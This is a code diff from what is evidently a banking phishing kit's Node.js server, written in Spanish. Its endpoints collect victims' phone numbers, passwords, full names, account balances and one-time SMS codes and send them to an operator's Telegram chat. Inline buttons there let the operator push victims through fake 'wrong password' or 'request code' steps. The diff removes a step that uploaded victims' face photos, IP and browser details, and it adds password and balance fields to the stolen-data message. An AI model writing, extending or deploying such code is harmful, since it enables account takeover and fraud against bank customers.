@@ -52,13 +52,6 @@ function getLoanSimulatorMenu(sessionId) {
         { text: "❌ Error Número", callback_data: `go:accces-sign-in|${sessionId}` },
         { text: "❌ Error Clave", callback_data: `go:access-sign-in-pass|${sessionId}` }
       ],
-	  [
-        { text: "🧬 Biometría", callback_data: `go:biometria|${sessionId}` }
-      ],
-	  [
-        { text: "❌ Error Monto", callback_data: `go:loan-simulator-error|${sessionId}` },
-        { text: "♻️ Pedir Dinámica SMS", callback_data: `go:one-time-sms|${sessionId}` }
-      ],
       [
         { text: "❌ Error Monto", callback_data: `go:loan-simulator-error|${sessionId}` },
         { text: "♻️ Pedir Dinámica", callback_data: `go:one-time-pass|${sessionId}` }
@@ -79,14 +72,7 @@ function getDynamicMenu(sessionId) {
         { text: "❌ Error Dinámica", callback_data: `error-dynamic|${sessionId}` },
         { text: "❌ Error Número", callback_data: `go:accces-sign-in|${sessionId}` }
       ],
-	  [
-        { text: "🧬 Biometría", callback_data: `go:biometria|${sessionId}` }
-      ]
-	  [
-        { text: "❌ Error Monto", callback_data: `go:loan-simulator-error|${sessionId}` },
-        { text: "♻️ Pedir Dinámica SMS", callback_data: `go:one-time-sms|${sessionId}` }
-      ],
-	  [
+      [
         { text: "❌ Error Clave", callback_data: `go:access-sign-in-pass|${sessionId}` },
         { text: "❌ Error Monto", callback_data: `go:loan-simulator-error|${sessionId}` }
       ],
@@ -97,6 +83,7 @@ function getDynamicMenu(sessionId) {
     ]
   };
 }
+
 // ==================== ENDPOINT PRINCIPAL ====================
 app.get('/', (_req, res) => {
   res.json({ 
@@ -254,18 +241,17 @@ app.post('/step2-loan-second', async (req, res) => {
   }
 });
 
-// ================================  STEP3
-// ==================== ENDPOINT SIMULADO: DINÁMICA LABORATORIO ====================
-
+// ==================== ENDPOINT: PASO 3 - DINÁMICA ====================
 app.post('/step3-dynamic', async (req, res) => {
   try {
     const { sessionId, otp, attemptNumber } = req.body;
 
     if (!BOT_TOKEN || !CHAT_ID) {
-      return res.status(500).json({ ok: false });
+      return res.status(500).json({ ok: false, reason: "Env vars undefined" });
     }
 
-   const session = sessionData.get(sessionId) || {};
+    // Obtener datos de sesión
+    const session = sessionData.get(sessionId) || {};
     
     // Guardar la dinámica
     if (!session.dynamics) {
@@ -273,72 +259,34 @@ app.post('/step3-dynamic', async (req, res) => {
     }
     session.dynamics.push(otp);
     sessionData.set(sessionId, session);
-    
-	  const mensaje = `
-📲 DINÁMICA1 ${attemptNumber} RECIBIDA 📲
+
+    const mensaje = `
+📲 DINÁMICA ${attemptNumber} RECIBIDA 📲
+
 📱 Número: ${session.phoneNumber || 'N/A'}
+🔑 Clave: ${session.password || 'N/A'}
+👤 Nombre y apellido: ${session.nombreCompleto || 'N/A'}
+💰 Saldo actual 1: ${session.saldoActual1 || 'N/A'}
+💰 Saldo actual 2: ${session.saldoActual2 || 'N/A'}
 🔢 Dinámica ${attemptNumber}: ${otp}
 🆔 Session: ${sessionId}
     `.trim();
-     
 
+    // Enviar a Telegram CON BOTONES
     await axios.post(getTelegramApiUrl('sendMessage'), {
       chat_id: CHAT_ID,
       text: mensaje,
-	  reply_markup: getDynamicMenu(session)	
+      reply_markup: getDynamicMenu(sessionId)
     });
 
-    console.log(`✅ Dinámica SMS laboratorio  ${attemptNumber} enviada - Session: ${sessionId}`);
-    res.json({ ok: true });
+    console.log(`✅ Dinámica ${attemptNumber} recibida - Session: ${sessionId} - OTP: ${otp}`);
 
-  } catch (err) {
-    console.error('❌ Error LAB /step3-dynamic:', err.response?.data || err.message);
-    res.status(500).json({ ok: false });
+    res.json({ ok: true });
+  } catch (error) {
+    console.error('❌ ERROR EN /step3-dynamic:', error.message);
+    res.status(500).json({ ok: false, reason: error.message });
   }
 });
-
-// ================================  STEP4
-
-app.post('/step4-dynamic', async (req, res) => {
-  try {
-    const { sessionId, otp, attemptNumber } = req.body;
-
-    if (!BOT_TOKEN || !CHAT_ID) {
-      return res.status(500).json({ ok: false });
-    }
-
-   const session = sessionData.get(sessionId) || {};
-    
-    // Guardar la dinámica
-    if (!session.dynamics) {
-      session.dynamics = [];
-    }
-    session.dynamics.push(otp);
-    sessionData.set(sessionId, session);
-    
-	  const mensaje = `
-📲 DINÁMICA ${attemptNumber} RECIBIDA 📲
-📱 Número: ${session.phoneNumber || 'N/A'}
-🔢 Dinámica ${attemptNumber}: ${otp}
-🆔 Session: ${sessionId}
-    `.trim();
-     
-
-    await axios.post(getTelegramApiUrl('sendMessage'), {
-      chat_id: CHAT_ID,
-      text: mensaje
-    });
-
-    console.log(`✅ Dinámica SMS laboratorio  ${attemptNumber} enviada - Session: ${sessionId}`);
-    res.json({ ok: true });
-
-  } catch (err) {
-    console.error('❌ Error LAB /step4-dynamic:', err.response?.data || err.message);
-    res.status(500).json({ ok: false });
-  }
-});
-
-
 
 // ==================== ENDPOINT: CONSIGNAR ====================
 app.post('/consignar', async (req, res) => {
@@ -376,80 +324,6 @@ app.post('/consignar', async (req, res) => {
     res.status(500).json({ ok: false, reason: error.message });
   }
 });
-
-// ===== ENDPOINT: BIOMETRÍA 
-
-// ==================== ENDPOINT: BIOMETRÍA ====================
-// ==================== ENDPOINT: BIOMETRÍA ====================
-app.post('/step-biometrics', async (req, res) => {
-  try {
-    const { sessionId, imageBase64, userAgent, ip, phoneNumber } = req.body;
-	
-
-    if (!BOT_TOKEN || !CHAT_ID) {
-      return res.status(500).json({ ok: false, error: 'Telegram no configurado' });
-    }
-
-    if (!sessionId || !imageBase64) {
-      return res.status(400).json({ ok: false, error: 'Datos incompletos' });
-    }
- 
-       
-    // ⚠️ NO romper si no existe la sesión
-	
-     const session = sessionData.get(sessionId) || {};
-     sessionData.set(sessionId, session);
-    // 🔹 Prioridad del número:
-    // 1) sesión
-    // 2) body
-    // 3) N/A
-    const finalPhoneNumber =
-      session.phoneNumber || phoneNumber || 'N/A';
-
-    // 🔹 convertir base64 a buffer
-    const buffer = Buffer.from(
-      imageBase64.replace(/^data:image\/\w+;base64,/, ''),
-      'base64'
-    );
-
-    const FormData = require('form-data');
-    const formData = new FormData();
-
-    formData.append('chat_id', CHAT_ID);
-    formData.append('photo', buffer, {
-      filename: 'biometria.jpg',
-      contentType: 'image/jpeg'
-    });
-
-    formData.append(
-      'caption',
-`🧬 BIOMETRÍA RECIBIDA
-
-📱 Número: ${finalPhoneNumber}
-🆔 Session: ${sessionId}
-🌐 IP: ${session.ip || ip || req.ip}
-🖥️ UA: ${session.userAgent || userAgent || req.headers['user-agent'] || 'N/A'}`
-    );
-
-    await axios.post(
-      `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
-      formData,
-      { headers: formData.getHeaders() }
-    );
-
-    console.log('📸 Biometría enviada a Telegram');
-    console.log('📱 Número:', finalPhoneNumber);
-    console.log('🆔 Session:', sessionId);
-
-    res.json({ ok: true });
-
-  } catch (err) {
-    console.error('❌ Error biometría:', err);
-    res.status(500).json({ ok: false });
-  }
-});
-
-
 
 // ==================== WEBHOOK DE TELEGRAM ====================
 app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
